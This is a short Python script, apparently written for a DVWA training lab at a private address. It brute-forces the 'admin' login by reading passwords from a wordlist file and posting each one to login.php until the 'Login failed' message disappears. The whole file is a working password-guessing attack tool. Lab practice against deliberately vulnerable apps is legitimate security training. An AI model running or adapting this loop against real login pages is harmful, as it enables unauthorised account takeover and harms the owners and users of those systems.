import requests



url = 'http://10.5.5.4/dvwa/login.php'
datadict = {"username":"admin", "password" : "","Login":"submit"}
#print response.content



with open('/root/Downloads/passwords.txt','r') as f:
	for line in f:
		word = line.strip()
		datadict['password'] = word
		response = requests.post(url,data=datadict)
		if 'Login failed' not in str(response.content):
			print ("Got password : ", word)
			exit()
print ("EOF")